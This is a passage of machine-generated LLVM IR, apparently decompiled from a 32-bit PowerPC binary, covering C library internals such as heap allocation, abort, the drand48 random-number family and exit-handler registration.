  store i32 %v0_100262e0, i32* %v3_100262e0, align 4
  br label %dec_label_pc_100262e4

dec_label_pc_100262e4:                            ; preds = %dec_label_pc_100262a8, %dec_label_pc_1002628c, %dec_label_pc_10026284, %dec_label_pc_10026268, %dec_label_pc_10026200, %dec_label_pc_100262b4
  %v0_100262e8 = load i32, i32* @r28, align 4
  ret i32 %v0_100262e8

; uselistorder directives
  uselistorder i32 %v1_100262c8, { 1, 0 }
  uselistorder i32 %v1_10026244, { 1, 0 }
  uselistorder i32 (i32*, i32, i32)* @__heap_free, { 0, 2, 1 }
  uselistorder i32* @global_var_10045150, { 0, 1, 3, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_1004da34.971 to i32), { 0, 6, 1, 7, 8, 2, 3, 9, 4, 10, 5, 11 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder i32 %arg1, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_100262e4, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_10026228, { 1, 0 }
}

define i32 @__heap_alloc_at(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_100262fc = load i32, i32* %arg1, align 4
  store i32 %v2_100262fc, i32* @r11, align 4
  store i32 %tmp, i32* @r8, align 4
  %v1_10026304 = add i32 %arg3, 3
  %v3_100263883 = icmp eq i32 %v2_100262fc, 0
  br i1 %v3_100263883, label %dec_label_pc_10026390, label %dec_label_pc_1002630c

dec_label_pc_1002630c:                            ; preds = %entry, %dec_label_pc_10026384
  %v0_10026384 = phi i32 [ %v3_10026384, %dec_label_pc_10026384 ], [ %v2_100262fc, %entry ]
  %v1_1002630c = inttoptr i32 %v0_10026384 to i32*
  %v2_1002630c = load i32, i32* %v1_1002630c, align 4
  %v2_10026310 = sub i32 %v0_10026384, %v2_1002630c
  %v1_10026314 = add i32 %v2_10026310, 12
  store i32 %v1_10026314, i32* @r9, align 4
  %v3_10026318 = icmp ugt i32 %v1_10026314, %arg2
  br i1 %v3_10026318, label %dec_label_pc_10026384, label %dec_label_pc_10026320

dec_label_pc_10026320:                            ; preds = %dec_label_pc_1002630c
  %v4_10026318 = icmp eq i32 %v1_10026314, %arg2
  br i1 %v4_10026318, label %dec_label_pc_10026328, label %dec_label_pc_10026390

dec_label_pc_10026328:                            ; preds = %dec_label_pc_10026320
  %v1_10026328 = call i32 @__asm_rlwinm(i32 %v1_10026304, i32 0, i32 0, i32 29)
  %v2_1002632c = icmp ult i32 %v2_1002630c, %v1_10026328
  br i1 %v2_1002632c, label %dec_label_pc_10026390, label %dec_label_pc_10026334

dec_label_pc_10026334:                            ; preds = %dec_label_pc_10026328
  %v1_10026334 = add i32 %v1_10026328, 44
  %v2_10026338 = icmp ult i32 %v2_1002630c, %v1_10026334
  br i1 %v2_10026338, label %dec_label_pc_10026340, label %dec_label_pc_10026374

dec_label_pc_10026340:                            ; preds = %dec_label_pc_10026334
  %v0_10026340 = load i32, i32* @r11, align 4
  %v1_10026340 = add i32 %v0_10026340, 4
  %v2_10026340 = inttoptr i32 %v1_10026340 to i32*
  %v3_10026340 = load i32, i32* %v2_10026340, align 4
  %v3_10026344 = icmp eq i32 %v3_10026340, 0
  br i1 %v3_10026344, label %dec_label_pc_10026354, label %dec_label_pc_1002634c

dec_label_pc_1002634c:                            ; preds = %dec_label_pc_10026340
  %v1_1002634c = add i32 %v0_10026340, 8
  %v2_1002634c = inttoptr i32 %v1_1002634c to i32*
  %v3_1002634c = load i32, i32* %v2_1002634c, align 4
  %v2_10026350 = add i32 %v3_10026340, 8
  %v3_10026350 = inttoptr i32 %v2_10026350 to i32*
  store i32 %v3_1002634c, i32* %v3_10026350, align 4
  %v0_10026354.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_10026354

dec_label_pc_10026354:                            ; preds = %dec_label_pc_10026340, %dec_label_pc_1002634c
  %v0_10026354 = phi i32 [ %v0_10026340, %dec_label_pc_10026340 ], [ %v0_10026354.pre, %dec_label_pc_1002634c ]
  %v1_10026354 = add i32 %v0_10026354, 8
  %v2_10026354 = inttoptr i32 %v1_10026354 to i32*
  %v3_10026354 = load i32, i32* %v2_10026354, align 4
  store i32 %v3_10026354, i32* @r10, align 4
  %v1_10026358 = add i32 %v0_10026354, 4
  %v2_10026358 = inttoptr i32 %v1_10026358 to i32*
  %v3_10026358 = load i32, i32* %v2_10026358, align 4
  store i32 %v3_10026358, i32* @r9, align 4
  %v3_1002635c = icmp eq i32 %v3_10026354, 0
  br i1 %v3_1002635c, label %dec_label_pc_1002636c, label %dec_label_pc_10026364

dec_label_pc_10026364:                            ; preds = %dec_label_pc_10026354
  %v2_10026364 = add i32 %v3_10026354, 4
  %v3_10026364 = inttoptr i32 %v2_10026364 to i32*
  store i32 %v3_10026358, i32* %v3_10026364, align 4
  ret i32 %v2_1002630c

dec_label_pc_1002636c:                            ; preds = %dec_label_pc_10026354
  %v1_1002636c = load i32, i32* @r8, align 4
  %v2_1002636c = inttoptr i32 %v1_1002636c to i32*
  store i32 %v3_10026358, i32* %v2_1002636c, align 4
  ret i32 %v2_1002630c

dec_label_pc_10026374:                            ; preds = %dec_label_pc_10026334
  %v2_10026374 = sub i32 %v2_1002630c, %v1_10026328
  %v1_1002637c = load i32, i32* @r11, align 4
  %v2_1002637c = inttoptr i32 %v1_1002637c to i32*
  store i32 %v2_10026374, i32* %v2_1002637c, align 4
  ret i32 %v1_10026328

dec_label_pc_10026384:                            ; preds = %dec_label_pc_1002630c
  %v1_10026384 = add i32 %v0_10026384, 4
  %v2_10026384 = inttoptr i32 %v1_10026384 to i32*
  %v3_10026384 = load i32, i32* %v2_10026384, align 4
  store i32 %v3_10026384, i32* @r11, align 4
  %v3_10026388 = icmp eq i32 %v3_10026384, 0
  br i1 %v3_10026388, label %dec_label_pc_10026388.dec_label_pc_10026390.loopexit_crit_edge, label %dec_label_pc_1002630c

dec_label_pc_10026388.dec_label_pc_10026390.loopexit_crit_edge: ; preds = %dec_label_pc_10026384
  br label %dec_label_pc_10026390

dec_label_pc_10026390:                            ; preds = %entry, %dec_label_pc_10026388.dec_label_pc_10026390.loopexit_crit_edge, %dec_label_pc_10026320, %dec_label_pc_10026328
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_10026384, { 1, 2, 0 }
  uselistorder i32 %v0_10026354, { 1, 0 }
  uselistorder i32 %v1_10026328, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1002630c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_10026384, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10026390, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_10026354, { 1, 0 }
  uselistorder label %dec_label_pc_1002630c, { 1, 0 }
}

define i32 @abort(i32 %arg1) local_unnamed_addr {
dec_label_pc_100263cc.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_100263b4.1383 to i32), i32* @lr, align 4
  %v1_100263b0 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_100450a0.1382 to i32))
  %v2_100263b8 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_100263b8, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 31, i32* %r9.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v3_100263d033 = add i32 %v2_100263b8, 124
  %v4_100263d034 = inttoptr i32 %v3_100263d033 to i32*
  store i32 0, i32* %v4_100263d034, align 4
  %v0_100263d435 = load i32, i32* %r9.global-to-local, align 4
  %v1_100263d436 = add i32 %v0_100263d435, -1
  store i32 %v1_100263d436, i32* %r9.global-to-local, align 4
  %v0_100263d837 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100263d838 = add i32 %v0_100263d837, -1
  store i32 %v1_100263d838, i32* %ctr.global-to-local, align 4
  %v2_100263d839 = icmp eq i32 %v1_100263d838, 0
  br i1 %v2_100263d839, label %dec_label_pc_100263dc, label %dec_label_pc_100263cc.dec_label_pc_100263cc_crit_edge

dec_label_pc_100263cc.dec_label_pc_100263cc_crit_edge: ; preds = %dec_label_pc_100263cc.lr.ph, %dec_label_pc_100263cc.dec_label_pc_100263cc_crit_edge
  %v1_100263d440 = phi i32 [ %v1_100263d4, %dec_label_pc_100263cc.dec_label_pc_100263cc_crit_edge ], [ %v1_100263d436, %dec_label_pc_100263cc.lr.ph ]
  %v0_100263d0.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_100263d0.pre = load i32, i32* %r29.global-to-local, align 4
  %v1_100263cc = mul i32 %v1_100263d440, 4
  %v3_100263d0 = add i32 %v1_100263cc, %v1_100263d0.pre
  %v4_100263d0 = inttoptr i32 %v3_100263d0 to i32*
  store i32 %v0_100263d0.pre, i32* %v4_100263d0, align 4
  %v0_100263d4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100263d4 = add i32 %v0_100263d4, -1
  store i32 %v1_100263d4, i32* %r9.global-to-local, align 4
  %v0_100263d8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100263d8 = add i32 %v0_100263d8, -1
  store i32 %v1_100263d8, i32* %ctr.global-to-local, align 4
  %v2_100263d8 = icmp eq i32 %v1_100263d8, 0
  br i1 %v2_100263d8, label %dec_label_pc_100263dc, label %dec_label_pc_100263cc.dec_label_pc_100263cc_crit_edge

dec_label_pc_100263dc:                            ; preds = %dec_label_pc_100263cc.dec_label_pc_100263cc_crit_edge, %dec_label_pc_100263cc.lr.ph
  store i32 %v2_100263b8, i32* @r3, align 4
  store i32 6, i32* @r4, align 4
  %v0_100263e4 = call i32 @__sigaddset()
  %v3_100263e8 = icmp eq i32 %v0_100263e4, 0
  br i1 %v3_100263e8, label %dec_label_pc_100263f0, label %dec_label_pc_10026400

dec_label_pc_100263f0:                            ; preds = %dec_label_pc_100263dc
  store i32 268592128, i32* @lr, align 4
  %v3_100263fc = call i32 @__GI_sigprocmask(i32 1, i32 %v2_100263b8, i32 0)
  br label %dec_label_pc_10026400

dec_label_pc_10026400:                            ; preds = %dec_label_pc_100263dc, %dec_label_pc_100263f0
  store i32 268697600, i32* @r9, align 4
  %v3_10026404 = load i32, i32* @global_var_10045294.1384, align 4
  %v3_10026408 = icmp eq i32 %v3_10026404, 0
  br i1 %v3_10026408, label %dec_label_pc_10026410, label %dec_label_pc_10026438

dec_label_pc_10026410:                            ; preds = %dec_label_pc_10026400
  store i32 1, i32* @global_var_10045294.1384, align 4
  br label %dec_label_pc_10026418

dec_label_pc_10026418:                            ; preds = %dec_label_pc_10026494, %dec_label_pc_10026410
  store i32 ptrtoint (i32* @global_var_100450a0.1382 to i32), i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100450a0.1382 to i32), i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10026428.1385 to i32), i32* @lr, align 4
  %v0_10026424 = call i32 @pthread_mutex_unlock()
  store i32 268592176, i32* @lr, align 4
  %v1_1002642c = call i32 @__GI_raise(i32 6)
  %v0_10026430 = load i32, i32* @r29, align 4
  store i32 268592184, i32* @lr, align 4
  %v1_10026434 = call i32 @pthread_mutex_lock(i32 %v0_10026430)
  %v3_1002643c.pre = load i32, i32* @global_var_10045294.1384, align 4
  br label %dec_label_pc_10026438

dec_label_pc_10026438:                            ; preds = %dec_label_pc_10026400, %dec_label_pc_10026418
  %v0_100264b0 = phi i32 [ %v3_10026404, %dec_label_pc_10026400 ], [ %v3_1002643c.pre, %dec_label_pc_10026418 ]
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10026440 = icmp eq i32 %v0_100264b0, 1
  br i1 %v3_10026440, label %dec_label_pc_10026480.lr.ph, label %dec_label_pc_100264b0

dec_label_pc_10026480.lr.ph:                      ; preds = %dec_label_pc_10026438
  %v2_1002644c = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_1002644c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 140, i32* @r5, align 4
  store i32 2, i32* @global_var_10045294.1384, align 4
  store i32 ptrtoint (i32* @global_var_10026460.1386 to i32), i32* @lr, align 4
  %v0_1002645c = call i32 @__GI_memset()
  store i32 %v2_100263b8, i32* @r8, align 4
  store i32 -1, i32* @r10, align 4
  store i32 0, i32* %stack_var_-168, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 %v3_100263d033, i32* %r9.global-to-local, align 4
  %v2_1002648825 = add i32 %v2_100263b8, 256
  %v3_1002648826 = inttoptr i32 %v2_1002648825 to i32*
  store i32 -1, i32* %v3_1002648826, align 4
  %v0_1002648c27 = load i32, i32* %r11.global-to-local, align 4
  %v1_1002648c28 = add i32 %v0_1002648c27, -1
  store i32 %v1_1002648c28, i32* @r11, align 4
  %v0_1002649029 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1002649030 = add i32 %v0_1002649029, -1
  store i32 %v1_1002649030, i32* %ctr.global-to-local, align 4
  %v2_1002649031 = icmp eq i32 %v1_1002649030, 0
  br i1 %v2_1002649031, label %dec_label_pc_10026494, label %dec_label_pc_10026480.dec_label_pc_10026480_crit_edge

dec_label_pc_10026480.dec_label_pc_10026480_crit_edge: ; preds = %dec_label_pc_10026480.lr.ph, %dec_label_pc_10026480.dec_label_pc_10026480_crit_edge
  %v1_1002648c32 = phi i32 [ %v1_1002648c, %dec_label_pc_10026480.dec_label_pc_10026480_crit_edge ], [ %v1_1002648c28, %dec_label_pc_10026480.lr.ph ]
  %v1_10026484.pre = load i32, i32* @r8, align 4
  %v0_10026488.pre = load i32, i32* @r10, align 4
  %v1_10026480 = mul i32 %v1_1002648c32, 4
  %v2_10026484 = add i32 %v1_10026480, %v1_10026484.pre
  store i32 %v2_10026484, i32* %r9.global-to-local, align 4
  %v2_10026488 = add i32 %v2_10026484, 132
  %v3_10026488 = inttoptr i32 %v2_10026488 to i32*
  store i32 %v0_10026488.pre, i32* %v3_10026488, align 4
  %v0_1002648c = load i32, i32* @r11, align 4
  %v1_1002648c = add i32 %v0_1002648c, -1
  store i32 %v1_1002648c, i32* @r11, align 4
  %v0_10026490 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10026490 = add i32 %v0_10026490, -1
  store i32 %v1_10026490, i32* %ctr.global-to-local, align 4
  %v2_10026490 = icmp eq i32 %v1_10026490, 0
  br i1 %v2_10026490, label %dec_label_pc_10026494, label %dec_label_pc_10026480.dec_label_pc_10026480_crit_edge

dec_label_pc_10026494:                            ; preds = %dec_label_pc_10026480.dec_label_pc_10026480_crit_edge, %dec_label_pc_10026480.lr.ph
  store i32 268592300, i32* @lr, align 4
  %v4_100264a8 = call i32 @__GI_sigaction(i32 6, i32* nonnull %stack_var_-168, i32 0)
  br label %dec_label_pc_10026418

dec_label_pc_100264b0:                            ; preds = %dec_label_pc_10026438
  %v3_100264b0 = icmp eq i32 %v0_100264b0, 2
  br i1 %v3_100264b0, label %dec_label_pc_100264b8, label %dec_label_pc_100264c4

dec_label_pc_100264b8:                            ; preds = %dec_label_pc_100264b0
  store i32 3, i32* @global_var_10045294.1384, align 4
  br label %dec_label_pc_100264c4

dec_label_pc_100264c4:                            ; preds = %dec_label_pc_100264b0, %dec_label_pc_100264b8
  %v3_100264c4 = phi i32 [ %v0_100264b0, %dec_label_pc_100264b0 ], [ 3, %dec_label_pc_100264b8 ]
  %v1_100264cc = icmp ne i32 %v3_100264c4, 3
  call void @__pseudo_cond_branch(i1 %v1_100264cc, i32 268592352)
  store i32 4, i32* @global_var_10045294.1384, align 4
  %v1_100264dc = call i32 @__GI__exit(i32 127)
  ret i32 %v1_100264dc

; uselistorder directives
  uselistorder i32 %v1_10026490, { 1, 0 }
  uselistorder i32 %v1_1002648c, { 1, 0 }
  uselistorder i32 %v1_100263d8, { 1, 0 }
  uselistorder i32 %v1_100263d4, { 1, 0 }
  uselistorder i32 %v2_100263b8, { 0, 2, 3, 4, 1, 5 }
  uselistorder i32* %r9.global-to-local, { 6, 2, 7, 5, 4, 3, 0, 1 }
  uselistorder i32* %ctr.global-to-local, { 9, 8, 4, 0, 1, 7, 6, 5, 2, 3 }
  uselistorder i32 (i32)* @__GI__exit, { 2, 1, 3, 10, 14, 12, 11, 0, 13, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 127, { 1, 5, 0, 2, 4, 6, 3 }
  uselistorder i32 (i32, i32*, i32)* @__GI_sigaction, { 3, 1, 2, 0 }
  uselistorder i32 132, { 4, 0, 1, 2, 3 }
  uselistorder i32 140, { 3, 0, 1, 2 }
  uselistorder i32 ()* @pthread_mutex_unlock, { 9, 11, 10, 2, 1, 0, 8, 7, 6, 20, 19, 18, 17, 21, 5, 4, 22, 3, 16, 15, 14, 13, 12 }
  uselistorder i32* @global_var_10045294.1384, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 (i32, i32, i32)* @__GI_sigprocmask, { 1, 5, 4, 3, 2, 11, 13, 14, 12, 15, 8, 7, 6, 0, 10, 9 }
  uselistorder i32 ()* @__sigaddset, { 0, 3, 2, 1, 4 }
  uselistorder i32 124, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_100450a0.1382 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_100264c4, { 1, 0 }
  uselistorder label %dec_label_pc_10026480.dec_label_pc_10026480_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10026438, { 1, 0 }
  uselistorder label %dec_label_pc_10026400, { 1, 0 }
  uselistorder label %dec_label_pc_100263cc.dec_label_pc_100263cc_crit_edge, { 1, 0 }
}

define i32 @lrand48_r(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r4, align 4
  %v2_100264f0 = inttoptr i32 %arg2 to i32*
  %v3_100264f0 = call i32 @nrand48_r(i32 %arg1, i32* %v2_100264f0)
  ret i32 %v3_100264f0
}

define i32 @nrand48_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* @r3, align 4
  store i32 %tmp, i32* %r30.global-to-local, align 4
  store i32 %arg1, i32* @r31, align 4
  %v0_1002650c = call i32 @__drand48_iterate()
  %v1_10026510 = icmp slt i32 %v0_1002650c, 0
  store i32 -1, i32* %r3.global-to-local, align 4
  br i1 %v1_10026510, label %dec_label_pc_10026538, label %dec_label_pc_1002651c

dec_label_pc_1002651c:                            ; preds = %entry
  %v0_1002651c = load i32, i32* @r31, align 4
  %v1_1002651c = add i32 %v0_1002651c, 2
  %v2_1002651c = inttoptr i32 %v1_1002651c to i16*
  %v3_1002651c = load i16, i16* %v2_1002651c, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10026524 = add i32 %v0_1002651c, 4
  %v2_10026524 = inttoptr i32 %v1_10026524 to i16*
  %v3_10026524 = load i16, i16* %v2_10026524, align 2
  %v4_10026524 = zext i16 %v3_10026524 to i32
  %div = udiv i16 %v3_1002651c, 2
  %v1_10026528 = zext i16 %div to i32
  %v1_1002652c = mul nuw i32 %v4_10026524, 32768
  %v2_10026530 = or i32 %v1_1002652c, %v1_10026528
  %v1_10026534 = load i32, i32* %r30.global-to-local, align 4
  %v2_10026534 = inttoptr i32 %v1_10026534 to i32*
  store i32 %v2_10026530, i32* %v2_10026534, align 4
  %v0_10026548.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10026538

dec_label_pc_10026538:                            ; preds = %entry, %dec_label_pc_1002651c
  %v0_10026548 = phi i32 [ -1, %entry ], [ %v0_10026548.pre, %dec_label_pc_1002651c ]
  ret i32 %v0_10026548

; uselistorder directives
  uselistorder label %dec_label_pc_10026538, { 1, 0 }
}

define i32 @__GI_srand48_r(i16 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to i16*
  %tmp1 = sext i16 %arg1 to i32
  %v5_10026550 = sdiv i32 %tmp1, 65536
  store i32 %v5_10026550, i32* %r9.global-to-local, align 4
  %v4_10026554 = add i32 %arg2, 14
  %v5_10026554 = inttoptr i32 %v4_10026554 to i16*
  store i16 1, i16* %v5_10026554, align 2
  store i32 -554958848, i32* %r10.global-to-local, align 4
  store i32 13070, i32* %r0.global-to-local, align 4
  %v0_10026560 = load i32, i32* %r9.global-to-local, align 4
  %v1_10026560 = trunc i32 %v0_10026560 to i16
  %v4_10026560 = add i32 %arg2, 4
  %v5_10026560 = inttoptr i32 %v4_10026560 to i16*
  store i16 %v1_10026560, i16* %v5_10026560, align 2
  %v5_10026564 = add i32 %arg2, 2
  %v6_10026564 = inttoptr i32 %v5_10026564 to i16*
  store i16 %arg1, i16* %v6_10026564, align 2
  store i32 5, i32* %r9.global-to-local, align 4
  %v0_1002656c = load i32, i32* %r0.global-to-local, align 4
  %v1_1002656c = trunc i32 %v0_1002656c to i16
  store i16 %v1_1002656c, i16* %tmp, align 2
  %v0_10026570 = load i32, i32* %r10.global-to-local, align 4
  %v1_10026570 = or i32 %v0_10026570, 58989
  store i32 %v1_10026570, i32* %r10.global-to-local, align 4
  store i32 11, i32* %r0.global-to-local, align 4
  %v0_1002657c = load i32, i32* %r9.global-to-local, align 4
  %v3_1002657c = add i32 %arg2, 16
  %v4_1002657c = inttoptr i32 %v3_1002657c to i32*
  store i32 %v0_1002657c, i32* %v4_1002657c, align 4
  %v0_10026580 = load i32, i32* %r10.global-to-local, align 4
  %v3_10026580 = add i32 %arg2, 20
  %v4_10026580 = inttoptr i32 %v3_10026580 to i32*
  store i32 %v0_10026580, i32* %v4_10026580, align 4
  %v0_10026584 = load i32, i32* %r0.global-to-local, align 4
  %v1_10026584 = trunc i32 %v0_10026584 to i16
  %v4_10026584 = add i32 %arg2, 12
  %v5_10026584 = inttoptr i32 %v4_10026584 to i16*
  store i16 %v1_10026584, i16* %v5_10026584, align 2
  ret i32 0
}

define i32 @__exit_handler(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268697600, i32* @r10, align 4
  store i32 268697600, i32* @r8, align 4
  %v3_100266084 = load i32, i32* @global_var_10045298.1388, align 4
  %v3_1002660c7 = icmp eq i32 %v3_100266084, 0
  %v1_100266108 = add i32 %v3_100266084, -1
  %v3_1002661c10 = load i32, i32* @global_var_1004529c.1387, align 4
  br i1 %v3_1002660c7, label %dec_label_pc_1002661c, label %dec_label_pc_100265a4

dec_label_pc_100265a4:                            ; preds = %entry, %dec_label_pc_10026600.backedge
  %v3_1002661c13 = phi i32 [ %v3_1002661c, %dec_label_pc_10026600.backedge ], [ %v3_1002661c10, %entry ]
  %v1_1002661011 = phi i32 [ %v1_10026610, %dec_label_pc_10026600.backedge ], [ %v1_100266108, %entry ]
  %v1_1002661412.in = phi i32 [ %v1_10026610, %dec_label_pc_10026600.backedge ], [ %v1_100266108, %entry ]
  %v1_1002661412 = mul i32 %v1_1002661412.in, 16
  store i32 %v1_1002661011, i32* @global_var_10045298.1388, align 4
  %v2_100265ac = add i32 %v3_1002661c13, %v1_1002661412
  %v3_100265ac = inttoptr i32 %v2_100265ac to i32*
  %v4_100265ac = load i32, i32* %v3_100265ac, align 4
  %v3_100265b4 = icmp eq i32 %v4_100265ac, 2
  br i1 %v3_100265b4, label %dec_label_pc_100265c8, label %dec_label_pc_100265c0

dec_label_pc_100265c0:                            ; preds = %dec_label_pc_100265a4
  %v3_100265b8 = icmp eq i32 %v4_100265ac, 3
  br i1 %v3_100265b8, label %dec_label_pc_100265e8, label %dec_label_pc_10026600.backedge

dec_label_pc_100265c8:                            ; preds = %dec_label_pc_100265a4
  %v1_100265c8 = add i32 %v2_100265ac, 4
  %v2_100265c8 = inttoptr i32 %v1_100265c8 to i32*
  %v3_100265c8 = load i32, i32* %v2_100265c8, align 4
  %v3_100265d0 = icmp eq i32 %v3_100265c8, 0
  br i1 %v3_100265d0, label %dec_label_pc_10026600.backedge, label %dec_label_pc_100265d8

dec_label_pc_100265d8:                            ; preds = %dec_label_pc_100265c8
  call void @__pseudo_call(i32 %v3_100265c8)
  br label %dec_label_pc_10026600.backedge

dec_label_pc_100265e8:                            ; preds = %dec_label_pc_100265c0
  %v1_100265e8 = add i32 %v2_100265ac, 4
  %v2_100265e8 = inttoptr i32 %v1_100265e8 to i32*
  %v3_100265e8 = load i32, i32* %v2_100265e8, align 4
  %v3_100265ec = icmp eq i32 %v3_100265e8, 0
  br i1 %v3_100265ec, label %dec_label_pc_10026600.backedge, label %dec_label_pc_100265f4

dec_label_pc_100265f4:                            ; preds = %dec_label_pc_100265e8
  call void @__pseudo_call(i32 %v3_100265e8)
  br label %dec_label_pc_10026600.backedge

dec_label_pc_10026600.backedge:                   ; preds = %dec_label_pc_100265f4, %dec_label_pc_100265d8, %dec_label_pc_100265c8, %dec_label_pc_100265e8, %dec_label_pc_100265c0
  store i32 268697600, i32* @r10, align 4
  store i32 268697600, i32* @r8, align 4
  %v3_10026608 = load i32, i32* @global_var_10045298.1388, align 4
  %v3_1002660c = icmp eq i32 %v3_10026608, 0
  %v1_10026610 = add i32 %v3_10026608, -1
  %v3_1002661c = load i32, i32* @global_var_1004529c.1387, align 4
  br i1 %v3_1002660c, label %dec_label_pc_1002661c, label %dec_label_pc_100265a4

dec_label_pc_1002661c:                            ; preds = %dec_label_pc_10026600.backedge, %entry
  %v3_1002661c.lcssa = phi i32 [ %v3_1002661c10, %entry ], [ %v3_1002661c, %dec_label_pc_10026600.backedge ]
  store i32 %v3_1002661c.lcssa, i32* @r3, align 4
  store i32 268592676, i32* @lr, align 4
  %v0_10026620 = call i32 @free()
  ret i32 %v0_10026620

; uselistorder directives
  uselistorder i32 %v1_10026610, { 1, 0 }
  uselistorder i32 %v2_100265ac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10026600.backedge, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_100265a4, { 1, 0 }
}

define i32 @__new_exitfn() local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1004503c.1250 to i32), i32* %r29.global-to-local, align 4
  %v2_10026658 = ptrtoint i32* %stack_var_-40 to i32
  %v4_10026660 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26856), i32 ptrtoint (i32* @global_var_1004503c.1250 to i32))
  store i32 268592752, i32* @lr, align 4
  %v1_1002666c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004503c.1250 to i32))
  %v3_10026674 = load i32, i32* @global_var_10045298.1388, align 4
  %v3_1002667c = load i32, i32* @global_var_100452a0.1390, align 4
  %v1_10026680 = add i32 %v3_10026674, 1
  store i32 %v1_10026680, i32* @r9, align 4
  %v2_10026684 = icmp slt i32 %v3_1002667c, %v1_10026680
  %v3_10026694 = load i32, i32* @global_var_1004529c.1387, align 4
  br i1 %v2_10026684, label %dec_label_pc_10026694, label %dec_label_pc_100266c4

dec_label_pc_10026694:                            ; preds = %entry
  %v1_10026688 = mul i32 %v3_1002667c, 16
  %v1_1002668c = add i32 %v1_10026688, 320
  store i32 268592796, i32* @lr, align 4
  %v2_10026698 = call i32 @realloc(i32 %v3_10026694, i32 %v1_1002668c)
  store i32 %v2_10026698, i32* %r29.global-to-local, align 4
  %v3_1002669c = icmp eq i32 %v2_10026698, 0
  br i1 %v3_1002669c, label %dec_label_pc_100266a4, label %dec_label_pc_100266b4

dec_label_pc_100266a4:                            ; preds = %dec_label_pc_10026694
  %v0_100266a4 = call i32 @__errno_location()
  %v2_100266ac = inttoptr i32 %v0_100266a4 to i32*
  store i32 12, i32* %v2_100266ac, align 4
  br label %dec_label_pc_100266fc

dec_label_pc_100266b4:                            ; preds = %dec_label_pc_10026694
  %v3_100266b4 = load i32, i32* @global_var_100452a0.1390, align 4
  store i32 %v2_10026698, i32* @global_var_1004529c.1387, align 4
  %v1_100266bc = add i32 %v3_100266b4, 20
  store i32 %v1_100266bc, i32* @global_var_100452a0.1390, align 4
  %v3_100266cc.pre = load i32, i32* @global_var_10045298.1388, align 4
  br label %dec_label_pc_100266c4

dec_label_pc_100266c4:                            ; preds = %entry, %dec_label_pc_100266b4
  %v3_100266d4 = phi i32 [ %v2_10026698, %dec_label_pc_100266b4 ], [ %v3_10026694, %entry ]
  %v3_100266cc = phi i32 [ %v3_100266cc.pre, %dec_label_pc_100266b4 ], [ %v3_10026674, %entry ]
  store i32 268697600, i32* @r8, align 4
  store i32 %v3_100266d4, i32* %r7.global-to-local, align 4
  %v1_100266dc = add i32 %v3_100266cc, 1
  %v1_100266e4 = mul i32 %v3_100266cc, 16
  store i32 %v1_100266e4, i32* @r10, align 4
  store i32 %v1_100266dc, i32* @global_var_10045298.1388, align 4
  store i32 268592524, i32* @global_var_10045244.1251, align 4
  %v3_100266f4 = add i32 %v1_100266e4, %v3_100266d4
  %v4_100266f4 = inttoptr i32 %v3_100266f4 to i32*
  store i32 1, i32* %v4_100266f4, align 4
  %v0_100266f8 = load i32, i32* @r10, align 4
  %v1_100266f8 = load i32, i32* %r7.global-to-local, align 4
